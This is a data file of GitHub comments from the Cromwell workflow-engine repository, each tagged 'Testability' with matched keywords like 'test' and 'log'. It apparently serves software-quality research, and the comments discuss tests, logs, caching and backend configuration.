Testability,"> would just need to keep in mind they do the lookup to get the docker size. @illusional well I suppose a `docker_size` argument can just as easily be implemented. After pulling the image can be queried for size. > After BCC2020 I want to revisit this PR, and could allow you to turn off the digest but keep call caching on?. Nope. Not yet anyway. And the code is intrically linked, so it is not going to be a one-liner fix. So this is why I have postponed working on this. This is an interesting thing to revisit at a later date. We use singularity containers on a SLURM backend, using the `singularity-permanent-cache` program to pull the images. For us that really works well, and our login node has contact with the internet, so this change is not really urgent. But for stability it is always nice if an internet connection is not required anymore after all the images are there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-661652343:688,log,login,688,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-661652343,1,['log'],['login']
Testability,>I'm pretty sure you just need to delete the quotation marks that are surrounding 4. I tested it before reporting the issue and it did not work both with and without quotes,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5166#issuecomment-539587892:87,test,tested,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5166#issuecomment-539587892,1,['test'],['tested']
Testability,>Merging despite the slurm test failure because:. I have considered and endorse this decision.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5445#issuecomment-597139719:27,test,test,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5445#issuecomment-597139719,1,['test'],['test']
Testability,">The issue is that she's asking to have everything dumped into one location. In many workflows I have a task like this:; ```. task copy {; Array[File] files; String destination. command {; mkdir -p ${destination}; cp -L -R -u ${sep=' ' files} ${destination}; }. output {; Array[File] out = files; }; }; ```; And I apply this task to all final outputs of my workflows because my colleagues do not want to go into super-nested folder structure with many debugging files (like logs and so on), they just want to get the final results! Having a flat-copy feature will save me from copy-pasting this task everywhere =) . Regarding overwrite risks, I think they are exaggerated:; 1) Usually, it takes you multiple runs until you get everything working, however, after that you switch to another dataset and point other members of the team to the folder they should go to pick the results from you. As I understand the copying of the workflow output happens only when the workflow succeeded.; 2) The final output folder is assigned in the options. That means that for another run you can simply change it.; 3) It is possible to put rewriting only if last file is newer than previous.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-345849355:474,log,logs,474,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-345849355,2,['log'],['logs']
Testability,">This change appears to validate the format of the disk requirements but then do nothing with the actual values? Is that correct?. AWS has auto-sizing and auto-expanding disks, so the concept of specifying a disk size is not applicable in this universe. This PR lets Cromwell ignore everything after `local-disk` instead of issuing an error. >Can we update the test cases which now work? I suspect custom_mount_point at least could be re-enabled?. `custom_mount_point` is not on the excluded list in `testCentaurAws.sh`. Are you requesting new coverage by adding `awsbatch` to the backends for `custom_mount_point.test`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4863#issuecomment-485902441:361,test,test,361,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4863#issuecomment-485902441,3,['test'],"['test', 'testCentaurAws']"
Testability,">do you have a test for the network and auth specified, but no subnetwork. Talked offline. The unit test for this is already added.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5027#issuecomment-504540935:15,test,test,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5027#issuecomment-504540935,2,['test'],['test']
Testability,">do you have a test for the network and auth specified, but no subnetwork?. @cjllanwarne do you mean a centaur test? Or unit test?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5027#issuecomment-504094777:15,test,test,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5027#issuecomment-504094777,3,['test'],['test']
Testability,"@BMurri Thank you! Yeah, we're having CI problems right now that are unrelated to these changes, I'll shepherd these tests through once those are resolved.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1419112237:117,test,tests,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1419112237,1,['test'],['tests']
Testability,"@DavyCats Nice workflow.; I have modified it slightly. It will now always fail. Unless call-caching is incorrect. An absolute path should be chosen for outputDir. ~~I have tested this with cromwell-41 and it fails at first. But succeeds when the second time when call-caching is enabled.~~. EDIT: Using this test workflow I found something really weird.; EDIT2: Nevermind, this does not work as a good test.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-496500819:172,test,tested,172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-496500819,3,['test'],"['test', 'tested']"
Testability,@EvanTheB I've updated my PR with a fix and a new test for this problem in task outputs. Thanks again for the bug report!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-403059207:50,test,test,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-403059207,1,['test'],['test']
Testability,@EvanTheB aha!. There must be something different between our test cases - the most obvious thing I can see is that your expression is in the task definition vs mine in the workflow definition. I'll investigate this now.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-403042558:62,test,test,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-403042558,1,['test'],['test']
Testability,"@EvanTheB thanks for this report! . I've [added a test](https://github.com/broadinstitute/cromwell/pull/3867) to make sure this check happens during static validation and amended the error message. I'll link this issue so that it gets closed when the PR merges, are you all set with how to fix the problem in your expression?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402842188:50,test,test,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402842188,1,['test'],['test']
Testability,"@Horneth @cjllanwarne sure we can make the choice of auths explicit in `genomics` and `filesystems`. I did want to keep it clear in the config which auth was for Cromwell and which was for the user so we didn't make it impossible to implement call log copying in FireCloud (in case someday we want to use that feature there). How about something like the following for FireCloud:. ``` hocon. // Same as the preceding FireCloud sample conf; google {; application-name = ""cromwell"". // There may be instances like the final call that copies call logs which will need to be able to generate both; // Cromwell and user authentication, so making these explicit.; cromwellAuthentication {; scheme = ""application_default""; }. // Used for engine functions involving the filesystem.; userAuthentication {; scheme = ""refresh""; client-id = ""secret_id""; client-secret = ""secret_secret""; }; }. // genomics with explicitly selected conf; genomics {; ...; auth = ""cromwell""; ...; }. ...; filesystems = [; // gcs filesystem with explicitly selected conf; gcs {; auth = ""user""; }; ]; ... ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203469472:248,log,log,248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203469472,4,['log'],"['log', 'logs']"
Testability,@Horneth @cpavanrun ; Should be good to merge now. Only still added something to the change log and did fix a link in the release 36 change log ;),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-432506335:92,log,log,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-432506335,2,['log'],['log']
Testability,@Horneth Are these the tests you implemented?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1329#issuecomment-324165601:23,test,tests,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1329#issuecomment-324165601,1,['test'],['tests']
Testability,"@Horneth I _think_ they dont' care about the tests, and I think we took the tests out of sbt assembly? ...Hmm I think the script was built for GOTC but I'll check with the GAWB team.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1507#issuecomment-251378603:45,test,tests,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1507#issuecomment-251378603,2,['test'],['tests']
Testability,"@Horneth I believe this is now tested as a part of restart testing, right?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2089#issuecomment-329662656:31,test,tested,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2089#issuecomment-329662656,2,['test'],"['tested', 'testing']"
Testability,"@Horneth I did see them talking about adding it in gitter, it was to provide a test for a bug which was found in toil. we should probably ask what the bug was and see if perhaps we're failing it for the same reason or if this was just an unfortunate side effect.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3092#issuecomment-354785169:79,test,test,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3092#issuecomment-354785169,1,['test'],['test']
Testability,@Horneth I don't think there is such a ticket currently but that makes sense as a test enhancementy sort of thing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2369#issuecomment-310722510:82,test,test,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2369#issuecomment-310722510,1,['test'],['test']
Testability,@Horneth I don't think you want to assume production will be an easier environment than unit tests :). What if every actor had its own data access? Within a workflow the overhead of doing so shouldn't be high,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143031435:93,test,tests,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143031435,1,['test'],['tests']
Testability,@Horneth I totally missed your message here. It was on the methods cromwell 30 instance. I'm not sure how to find logs. My guess is that if they're produced by default they're still available somewhere.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-398134854:114,log,logs,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-398134854,1,['log'],['logs']
Testability,"@Horneth In general, how did you test/benchmark this stuff?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232176168:33,test,test,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232176168,2,"['benchmark', 'test']","['benchmark', 'test']"
Testability,@Horneth does it make the unit tests a mess? Or is it just ugliness that makes us cringe slightly?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-325483348:31,test,tests,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-325483348,1,['test'],['tests']
Testability,@Horneth how about this ticket for testing aborts?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-337074635:35,test,testing,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-337074635,1,['test'],['testing']
Testability,"@Horneth it still feels like debug information to me - especially if you have ~100 workflows happening simultaneously? . Can we make this ""debug"" and allow the logback.xml to make JesBackendCall log at ""debug"" level?. But, happy to be overruled by the next reviewer. The wheel chooses @scottfrazer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/507#issuecomment-193334208:160,log,logback,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/507#issuecomment-193334208,2,['log'],"['log', 'logback']"
Testability,@Horneth it's in `src/main/resources/standardTestCases/missing_imports.test`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289807967:71,test,test,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289807967,1,['test'],['test']
Testability,"@Horneth right, and we don't need to do that any more because we rebuild the entire execution store every time we restart. I've updated this to now have stable subworkflow names for those ""nested scatter"" subworkflows. Do we have an existing ""check subworkflows restart correctly"" test I can duplicate for draft 3?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3388#issuecomment-372432202:281,test,test,281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3388#issuecomment-372432202,1,['test'],['test']
Testability,@Horneth was this issue covered by the fixes you made after you implemented the restart tests?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1441#issuecomment-325454037:88,test,tests,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1441#issuecomment-325454037,1,['test'],['tests']
Testability,"@LeeTL1220 @Horneth I doubt enabling continue on return would work. You are getting timeouts not only when uploading log files, but also when localizing files. Ive observed this occasionally to with wide scatters and multiple workflows. ; It starting to seem more like an api Issue. I know in the cromwell conf there is a property for setting the total number of concurrent workflows, but I do not know if this is extended to the task level. It would be interesting to see whether or not limiting the number of concurrent tasks in a scatter would have any impact on this. That or better scattering the task submission for scatters instead of submitting all tasks basically at once. This is one of our major pain points too. So far the only reasonable solution we have had (other then adjusting api quotas) is just to tell users to rerun a wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559:117,log,log,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559,1,['log'],['log']
Testability,"@LeeTL1220 @patmagee I'd been paying less attention to this than I should have. I mentioned to @LeeTL1220 yesterday that the general issue of ""sometimes logs fail to upload and it doesn't retry a ton - but Google knows this"". However looking at the frequency and the actual errors makes me think I need to ping Google to make sure they know about the errors themselves. Perhaps there's something more fundamentally wrong going on that they're blissfully unaware of.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300186858:153,log,logs,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300186858,1,['log'],['logs']
Testability,"@LeeTL1220 Any more updates on this ticket?. In general we were wondering if a `gcloud logout` and then `gcloud login` helped. If this is no longer an issue, mind closing this one, and open another in the future with current wdl / details / version-info?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-282576487:87,log,logout,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-282576487,2,['log'],"['login', 'logout']"
Testability,"@LeeTL1220 But not for all use cases. The problem is that we have too many different types of people coming in and saying ""XYZ is reasonable"" and they're not remotely compatible. The solution we're going with is to stop trying to be all things to all people with a monolithic log. It'll be some time before that happens, but that's the idea.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281830294:276,log,log,276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281830294,1,['log'],['log']
Testability,@LeeTL1220 Do you have a reproducible test case? Otherwise we probably need to close this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1895#issuecomment-320524441:38,test,test,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1895#issuecomment-320524441,1,['test'],['test']
Testability,@LeeTL1220 Do you have a reproducible test case? Otherwise we'll have to close this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1773#issuecomment-320524669:38,test,test,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1773#issuecomment-320524669,1,['test'],['test']
Testability,@LeeTL1220 I'm seeing the same log copying failure in our test suite actually. So it very likely isn't your doing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-299019648:31,log,log,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-299019648,2,"['log', 'test']","['log', 'test']"
Testability,"@LeeTL1220 are you using the workflow options ""final_workflow_log_dir"" to copy workflow logs?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265761144:88,log,logs,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265761144,1,['log'],['logs']
Testability,@LeeTL1220 can I close this ? Cromwell does handle spaces properly now we have a test for it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1754#issuecomment-288147368:81,test,test,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1754#issuecomment-288147368,1,['test'],['test']
Testability,"@LeeTL1220 so I haven't been able to get cromwell to exit with a non 0 exit code, although I do get a bunch of log errors like yours. I created a branch that shuts the system down in a cleaner way, which I believe is the reason for this error : `cromwell-2079`.; If you can test it out and see if it makes any difference that would be very useful.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2079#issuecomment-290824542:111,log,log,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2079#issuecomment-290824542,2,"['log', 'test']","['log', 'test']"
Testability,"@LeeTL1220 this is a dual problem: [aborts need work](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit), and [logs need work](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). I'm going to link this issue there and close it out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1637#issuecomment-325668920:146,log,logs,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1637#issuecomment-325668920,1,['log'],['logs']
Testability,"@TMiguelT - Thanks! The logs should help me debug what's going here. I've seen this intermittently in the past, but it was difficult to catch.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4674#issuecomment-468888510:24,log,logs,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4674#issuecomment-468888510,1,['log'],['logs']
Testability,"@TimurKustov You just need to specify it in the [centaur test description](https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/standardTestCases/docker_alpine.test#L8) of , with a pointer to where the option file lives",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-519615534:57,test,test,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-519615534,2,['test'],['test']
Testability,@abaumann can you tell me a use case for when a user would want Cromwell to periodically copy the workflow logs?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1448#issuecomment-324662304:107,log,logs,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1448#issuecomment-324662304,1,['log'],['logs']
Testability,"@adamstruck I still need to do a more in depth review if you're looking for scala syntax feedback (ex: `case … => { … }` could be `case … => …`). Early feedback:. - PR 1930 contains a few more changes to the standard backend api. I tested cherry-picking 1930 onto this PR to see what would be left to patch up. Using an ""Obsolete"" set of bridge code for now, [these](https://github.com/kshakir/cromwell/commit/19f3bad4ca752ac47ab6f37b694dbdaec8850b36) are the minimal changes for the updated path api, plus changes for standardized command line generation. NOTE: 1930 is still under review and may change, plus the linked github commit will be deleted once these two PRs are merged. - The standard backend will continue to change for a while as we move more common code. For example, the script generation for globs is now centralized as of PR 1930. The only CI testing I am aware of at the moment is `sbt tesBackend/test` that runs under travis. Is there a dockerized solution yet for TES that we could use with travis centaur, like we have for JES and Local? Otherwise, the minimal patches above pass the very, very basic sbt test unit tests. - Your PR is ok as is, but I need to think about necessity of `Async.await` a bit more. The standard backend api is synchronous, requiring the `Async.await`. But the underlying ""basic"" backend trait is using scala futures, and I need more insight into how those are interacting with the akka actors. For example, I wouldn't want the actors receiving multiple akka poll messages in the mailbox and then queuing up dozens of overlapping poll futures in the thread pool. I also really like that your awaits have timeouts and aren't infinite futures. More to come. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-276378295:232,test,tested,232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-276378295,10,['test'],"['test', 'tested', 'testing', 'tests']"
Testability,@adamstruck That test tries to run a Docker image which has a default user which is not root (the test was created based on [this ticket](https://github.com/broadinstitute/cromwell/issues/472)). That error looks like the non-root user in the container doesn't have execute permission on the script that was created by Cromwell running as a different user.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1979#issuecomment-279848503:17,test,test,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1979#issuecomment-279848503,2,['test'],['test']
Testability,@aednichols . * I'm running cromwell server using v36. I haven't tested cromwell 35 in server mode. ; * This same workflow has been run successfully on local backend using both Cromwell version 35 and 36.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4509#issuecomment-451241462:65,test,tested,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4509#issuecomment-451241462,1,['test'],['tested']
Testability,@aednichols @cjllanwarne I have added tests for the new implementation of `flatten` method. Requesting re-reviews,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-765110157:38,test,tests,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-765110157,1,['test'],['tests']
Testability,"@aednichols @cjllanwarne I made a copy of this PR with the same tests and changelog, but with a less intrusive code change at #5495 .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618975226:64,test,tests,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618975226,1,['test'],['tests']
Testability,"@aednichols @cjllanwarne, I had looked into adding log message inside `withRetryForTransactionRollback` method before. But I was not able to find a logger class that can be used. But I can take a look at it again. Agreed that having some kind of indication that retrying is happening will be good.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6363#issuecomment-860684404:51,log,log,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6363#issuecomment-860684404,2,['log'],"['log', 'logger']"
Testability,@aednichols @kshakir requesting re-reviews because I had to make a more substantial change to the interpolation logic.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5026#issuecomment-501851960:112,log,logic,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5026#issuecomment-501851960,1,['log'],['logic']
Testability,"@aednichols @mcovarr : Please let us know if you have any feedback on this PR. I would like to confirm this is in the right direction before working on tests and getting this ready for merging. Alternatively, please let me know if I should reach out to someone else for review.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7545#issuecomment-2357254944:152,test,tests,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7545#issuecomment-2357254944,2,['test'],['tests']
Testability,@aednichols I have added a new test to cover the changes in this PR.; Please let me know if you need anything further,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-566800420:31,test,test,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-566800420,1,['test'],['test']
Testability,"@aednichols I've rebased on develop couple days ago.; There only one job fails (https://travis-ci.com/broadinstitute/cromwell/jobs/231053156), and the last lines of log are:; ```; No output has been received in the last 10m0s, this potentially indicates a stalled build or something wrong with the build itself.; Check the details on how to adjust your build configuration on: https://docs.travis-ci.com/user/common-build-problems/#build-times-out-because-no-output-was-received; The build has been terminated; ```. Never saw this before, so I don't know how to fix this...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-527959017:165,log,log,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-527959017,1,['log'],['log']
Testability,"@aednichols Thanks again for allowing me push access to the repo. I can not test all the backends manually so it is good that I can access the CI environment and see if the bug fix turned out well. What is the formal process of getting this bug under the Cromwell team's attention? I have made a JIRA issue. Should I put it on the sprint? I also ask this for #5456 which is a really simple fix. I am not in great haste getting a review, but I want to ensure these fixes end up in the next release of Cromwell. These bugs are now actively blocking BioWDL development as our CI always uses a mainline version of Cromwell. (Usually the latest, but we are already actively excluding 49 because of the relative outputs bug). . By no means I want to push the Cromwell team in reviewing these fixes right now, but if you could give me some procedure that would make sure these are reviewed before the next release is out, that would give me some peace of mind. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-611900735:76,test,test,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-611900735,2,['test'],['test']
Testability,@aednichols Yes...! Now asserted,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4479#issuecomment-445960949:24,assert,asserted,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4479#issuecomment-445960949,1,['assert'],['asserted']
Testability,"@aednichols and @rsasch - yes, `Integer.MIN_VALUE` is some huge negative value. I tested with a fetchSize of ""1"" and got the same out of memory errors as when it was 1000. I don't know whether `Integer.MIN_VALUE` is a special sentinel value or any value below 0 would do.... but since it works, I'm inclined to treat it as a magic number, and document it as such.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6314#issuecomment-819743136:82,test,tested,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6314#issuecomment-819743136,1,['test'],['tested']
Testability,"@aednichols tested that just now. The experience is similar to the ""I don't have git hooks installed"" case (ie see the two final `[error]` messages):; ```; $ sbt compile; [...]; [info] Executing in batch mode. For better performance use sbt's shell; [info] Executing pre-compile script...; [error] You are not running our custom git commit hooks. If you are making changes to the codebase, we recommend doing this (by running 'git config --add core.hooksPath hooks/') to ensure that your cryptographic secrets are not committed to our repository by accident.; [error] If you don't want to set up hooks (if you never intend to commit to the cromwell repo, can be sure that you won't commit secrets by accident, or have already installed git-secrets in this repo separately), you can suppress this error by running with: 'sbt -Dignore-hooks-check=true [...]'; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510938820:12,test,tested,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510938820,1,['test'],['tested']
Testability,@aednichols that's correct. There already exists end-to-end tests to check this functionality.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5552#issuecomment-648445377:60,test,tests,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5552#issuecomment-648445377,1,['test'],['tests']
Testability,"@aednichols the comments are resolved and tests are passing, thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7411#issuecomment-2110744992:42,test,tests,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7411#issuecomment-2110744992,1,['test'],['tests']
Testability,"@aednichols would you mind investigating this and confirming if this is the case? I believe our centaur tests should be using tabs and such, but let me know if I misunderstood. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051#issuecomment-417333602:104,test,tests,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051#issuecomment-417333602,1,['test'],['tests']
Testability,"@alexagrf Would it be possible to add some tests here? I realize that it can be difficult to do that w/ auth code, so if this seems like a challenge perhaps we can work out a way w/ you to develop some integration tests we could fold into our internal system",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5088#issuecomment-516670868:43,test,tests,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5088#issuecomment-516670868,2,['test'],['tests']
